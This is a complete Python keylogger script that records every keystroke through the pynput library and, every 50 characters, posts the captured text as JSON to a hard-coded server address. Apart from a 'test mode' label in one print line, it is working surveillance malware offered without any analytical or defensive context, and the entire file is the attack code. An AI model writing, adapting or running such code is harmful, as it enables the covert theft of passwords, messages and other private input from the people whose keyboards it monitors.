from pynput import keyboard
import requests
import json

POST_URL = "http://192.168.43.7/log"
LOG_LIMIT = 50

log = ""

def send_to_server(log_data):
    payload = {"keystrokes": log_data}
    try:
        response = requests.post(POST_URL, json=payload)
        if response.status_code == 200:
            print("[+] Log sent successfully.")
        else:
            print("[-] Server error:", response.status_code)
    except Exception as e:
        print("[-] Could not send log:", str(e))

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += ' '
        elif key == keyboard.Key.enter:
            log += '\n'
        else:
            log += f"[{key.name}]"

    if len(log) >= LOG_LIMIT:
        send_to_server(log)
        log = ""

print("[*] Starting keylogger (test mode)")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
